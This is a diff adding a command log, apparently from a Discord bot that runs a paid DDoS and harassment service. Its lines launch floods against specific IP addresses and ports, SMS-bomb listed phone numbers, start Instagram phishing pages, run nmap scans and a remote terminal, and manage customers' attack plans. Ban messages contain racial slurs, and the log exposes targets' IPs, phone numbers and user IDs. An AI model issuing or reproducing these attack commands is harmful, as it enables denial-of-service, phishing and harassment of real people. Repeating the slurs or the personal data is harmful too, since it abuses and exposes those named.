@@ -1,0 +1,482 @@
+/getbots
+/nuke
+/nuke
+/nuke
+/getbots
+/reboot
+/getbots
+/reboot
+/reboot
+/getbots
+/ddos std 95.249.29.47 30 dport=80
+/reboot
+/reboot
+/getbots
+/ddos std 95.249.29.47 30 dport=80
+/ping 95.249.29.47
+/adduser 368217851389280256 1
+/getplan <@368217851389280256>
+/changeplan 368217851389280256 1
+/getplan <@368217851389280256>
+/getbots
+/adduser 293444299402772481 3
+/reboot
+/tr4p
+/adduser 293444299402772481 1
+/getplan <@293444299402772481>
+/changeplan 293444299402772481 3
+/getplan <@293444299402772481>
+/ddos udpplain 51.124.140.3 10 dport=30100
+/adduser 696801406971281490 1
+/getplan <@696801406971281490>
+/changeplan 696801406971281490 1
+/getplan <@696801406971281490>
+/getbots
+/checknet
+/getlog 293444299402772481
+/ban <@293444299402772481>
+/ban <@293444299402772481>  Telling shit and say that im a scammer and telling net dont work even if 5 people say it does and spammed me aswell as insulting me
+/admin
+/removeuser 293444299402772481
+/getplan <@293444299402772481>
+/getplan 293444299402772481
+/nuke
+/getplan <@293444299402772481>
+/changeplan 293444299402772481 3
+/getplan <@293444299402772481>
+/increasetime 293444299402772481 86400000
+/admin
+/increaseplan 293444299402772481 86400000
+/getplan <@293444299402772481>
+/nuke
+/getbots
+/getbots
+/tr4p
+/getbots
+/tr4p
+/reboot
+/tr4p
+/planusers
+/admin
+/getbots
+/getplan <@510904684123521024>
+/getbots
+/getbots
+/pish instagram
+/phishoptions
+/pish Instagram
+/phish Instagram
+/check
+/check
+/check
+/check
+/phishquit
+/nuke
+/methods
+/tr4p
+/terminal HackerBoy123
+/run ls
+/run ifconfig
+/run ls
+/nano owner.sh
+/reboot
+/getbots
+/reboot
+/getbots
+/getbots
+/reboot
+/getbots
+/getbots
+/ban <@!529712713513828352> told trash and braked the net  rules more than one time
+/getbots
+/phish
+/check
+/phishquit
+/getbota
+/exitterminal
+/quitterminal
+/terminalquit
+/terminal HackerBoy123
+/echo
+/ifconfig
+/ifconfig
+/clear
+/help
+/terminalquit
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/ddos udp 18.157.76.251 1
+/getbots
+/getbots
+/getplans
+/planusers
+/getbots
+/tr4p
+/dbadd utcmania85 95.249.29.47
+/dbsearch utcmania85
+/dbsearch test1
+/nuke
+/dbsearch test1
+/dbsearch test2
+/dbshow
+/getbots
+/getbots
+/getplan <@509066161778851872>
+/hitlist
+/ping 173.61.102.237
+/ping 173.61.102.237
+/ping 173.61.102.237
+/nuke
+/getbots
+/getplan  <@293757414182748160>
+/getplan
+/tr4p
+/admin
+/getplan <@293757414182748160>
+/planusers
+/planusers
+/getbots
+/getbots
+/getbots
+/nmap 185.172.110.214
+/nmapresult
+/nmap 117.255.231.96
+/nmapresult
+/nmap result
+/nmapresult
+/nuke
+/nuke
+/getplan <@193289250068889600>
+/clear 100
+/tr4p
+/clear 100
+/admin
+/changeip
+/changeip  185.172.110.214 185.172.111.195
+/reboot
+/ddos std 95.249.29.47 30
+/ddos /udp 93.211.123.206    40 dport=80
+/ddos udp 93.211.123.206 40 dport=80
+/ddos std 93.211.123.206 10 dport=80
+/nuke
+/changeip 185.172.111.195 185.172.110.214
+/getbots
+/reboot
+/getbots
+/tr4p
+/getbots
+/ddos std 20.191.53.220 30 dport=30020
+/getbots
+/getbots
+/getbots
+/reboot
+/tr4p
+/getbots
+/admin
+/checknet
+/getbots
+/ddos std 97.100.62.12 60 dport=80
+/ddos udp 95.249.29.47 30 dport=80
+/getbots
+/changeip 185.172.111.195 185.172.110.214
+/reboot
+/getbots
+/changeip 185.172.110.214 185.172.110.214
+/getbots
+/reboot
+/getbots
+/getbots
+/getbots
+/getbots
+/lagstop
+/checkip 35.178.192.102
+/getbots
+/checkip 185.185.134.225
+/getbots
+/getbots
+/methods
+/checkip 185.185.134.56
+/getbots
+/nuke
+/reboot
+/admin
+/checknet
+/checknet
+/reboot
+/checktnet
+/checknet
+/getbots
+/clear 4
+/checknet
+/getbots
+/reboot
+/getbota
+/getbots
+/checknet
+/getbots
+/getbots
+/getbots
+/checknet
+/getplan <@551499467929681920>
+/checkip 216.135.49.112
+/getplan <@409496215135191043>
+/hitlist
+/getbots
+/tr4p
+/ping 45.140.168.148
+/ddos udp 1.1.1.1 1 dport=80
+/ddos std 2.122.175.8 60 sport=80
+/ddos std 2.122.175.8 60 dport=80
+/getlog 675837090126102560
+/checkip 172.67.195.70
+/tr4p
+/admin
+/clear 100
+/getbots
+/getbots
+/checknet
+/getbots
+/reboot
+/getbots
+/gstbots
+/getbots
+/checknet
+/getbots
+/getbots
+/getbots
+/tr4p
+/sms
+/sms +4917642951029 10
+/nuke
+/getbots
+/nuke
+/sms +4917642951029
+/tr4p
+/sms +4917642951029 20
+/ban <@723675478556278853>
+/ban <@723675478556278853>  skid
+/gebots
+/getbots
+/getelite
+/admin
+/eliteusers
+/clear 100
+/clear 100
+/nuke
+/ddos std 1.1.1.1 20 60
+/methods
+/ddos std 123.45.23.2 20 60
+/getplan <@235063148149735424>
+/changeplan <@235063148149735424>
+/admin
+/changeplan <@235063148149735424> 1
+/getplan <@235063148149735424>
+/trp
+/price
+/prices
+/nuke
+/methods
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/fuck <@329684754142199808>  so hard till he understand there is no free hit
+/getbots
+/getbots
+/nuke
+/getbots
+/getplan <@193289250068889600>
+/getbots
+/ping 143.59.137.169
+/ping 143.59.137.169
+/ping 143.59.137.169
+/checkip 143.59.137.169
+/ping 143.59.137.169
+/nuke
+/ban  <@616363889529192449>
+/ban  <@616363889529192449> stop being a nigga asking for free hits
+/reboot
+/getbots
+/getplan <@551499467929681920>
+/getlog @MUTED#1000
+/getlog 551499467929681920
+/getlog 551499467929681920
+/admin
+/changeplan 1 <@251847438724235274>
+/plan <@251847438724235274>
+/getplan <@251847438724235274>
+/getplan <@251847438724235274>
+/addplan 1 <@251847438724235274>
+/adduser 251847438724235274 1
+/getplan <@251847438724235274>
+/changeplan 1 <@251847438724235274>
+/getplan <@251847438724235274>
+/changeplan <@251847438724235274> 1
+/getplan <@251847438724235274>
+/admin
+/increaseplan 251847438724235274 172800000
+/getplan <@251847438724235274>
+/getbots
+/reboot
+/getbots
+/checkip 73.184.138.11
+/ddos stdhex 73.184.138.11 30
+/ping 73.184.138.11
+/gstbots
+/getbots
+/getbots
+/ping http://45.95.168.82/
+/ping a
+/ping 45.95.168.82
+/stdhex 45.95.168.82 200 22
+/ddos stdhex 45.95.168.82 200 22
+/ping 45.95.168.82
+/ping 45.95.168.82
+/getbots
+/sms
+/sms +14802416084 100
+/plan
+/plans
+/getbots
+/getbots
+/mwthoda
+/methods
+/plans
+/getbots
+/clear 10
+/clear 1ß
+/clear 10
+/clear 10
+/clear 10
+/getbots
+/getbots
+/getbots
+/bots
+/getbots
+/getbots
+/getbots
+/Getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/nuke
+/ping 73.22.250.51
+/getbots
+/getbots
+/getbots
+/getbots
+/getbots
+/clear 100
+/nmapresult
+/nmapsv 45.95.168.214
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/help
+/tr4p
+/nmapresult
+/nmapresults
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/reboot
+/nmapresult
+/nmapresult
+/nmapresult
+/ban <@708478904305713195> NO FUCKING FREE HITS
+/ban <@724114790032605185>  helped him for free hit
+/ban <@724114790032605185>
+/ban <@724114790032605185> free hit shit
+/ban <@724114790032605185> lol
+/nuke
+/getplan <@710436291744890891>
+/vpn
+/spotify
+/getlog  551499467929681920
+/getbots
+/xboxcode
+/bbsoftban <@609967500574195724>
+/ban <@609967500574195724> ads
+/getbots
+/getbots
+/methods
+/getlog 727464773104697434
+/getlog <@727464773104697434>
+/bön <@305921615282307083> unfunny
+/getbots
+/admin
+/phish
+/getplan @GamingOfficeYT#1205
+/getplan 193289250068889600
+/tr4p
+/phishoptions
+/phish Instagram
+/phish Instagram
+/getbots
+/getbots
+/getbots
+/phish Instagram
+/getbots
+/getbots
+/getplan <@226455931376893963>
+/admin
+/trialusers
+/eliteusers
+/getlog 698451241667133502
+/admin
+/getplan <@634361766347800576>
+/removeplan <@634361766347800576>
+/changeplan <@634361766347800576> 0
+/getplan <@!634361766347800576>
+/getlog 634361766347800576
+/getlog 418537208396644352
+/ddos std 1.2.4.2 4
+/getplan <@193289250068889600>
+/getplan
+/getplan 193289250068889600
+/plan
+/getlog 305921615282307083
+/forceplanupdates
+/forceplan
+/forceplanupdates
+/getlog 305921615282307083
+/getbots
+/getplan <@389973434605633542>
+/ban <@663265246688837653> Fucking read rules nigga
+/getbots
+/getbots
+/raine <#727085063124025385>
+/getplan <@343782264326324225>
+/getbots
+/plan
